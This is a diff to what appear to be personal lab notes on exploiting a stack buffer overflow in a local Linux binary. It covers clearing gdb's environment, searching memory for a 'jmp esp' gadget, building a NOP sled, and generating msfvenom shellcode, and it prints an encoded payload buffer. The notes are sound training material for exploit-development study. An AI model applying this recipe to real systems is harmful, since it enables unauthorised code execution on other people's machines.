@@ -746,19 +746,21 @@ run <<<$(./buffer.py)
 ```
 env - gdb ./func
 ```
-in gdb 
+in "clean" gdb, so no plugins
 ```
 unset env COLUMNS
 unset env LINES
 ```
 
+get jmp esp
+```
+find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP)
+```
+
+get memory map locations:
 ```
 info proc map
 ```
-
-f7de1000
-
-ffffe000
 
 ```
 msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
@@ -769,3 +771,25 @@ or you can load up msfconsole.
 ```
 ./func <<<$(./buffer.py)
 ```
+
+
+- unset environmentals
+- run executable, break the buffer
+- run proc map
+- first memory adress after heap, and the very last address in the stack
+- ``` find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP) ```
+- grab the first 4 memory addresses, change from little to big endian
+- nop sled ``` nop = "\x90" * 15 ```
+- either msfconsole or msfvenom to generate the shellcode
+	- ie
+```
+buf =  b""
+buf += b"\xda\xca\xba\xf7\xa8\x24\x7c\xd9\x74\x24\xf4\x5f"
+buf += b"\x33\xc9\xb1\x0b\x83\xef\xfc\x31\x57\x15\x03\x57"
+buf += b"\x15\x15\x5d\x4e\x77\x81\x07\xdd\xe1\x59\x15\x81"
+buf += b"\x64\x7e\x0d\x6a\x04\xe8\xce\x1c\xc5\x8a\xa7\xb2"
+buf += b"\x90\xa9\x6a\xa3\xa4\x2d\x8b\x33\xdc\x45\xe4\x52"
+buf += b"\x4f\xfc\xfa\xc3\xdc\x77\x1b\x26\x62"
+```
+
+Have to do on 2 machines, your's and the targets.
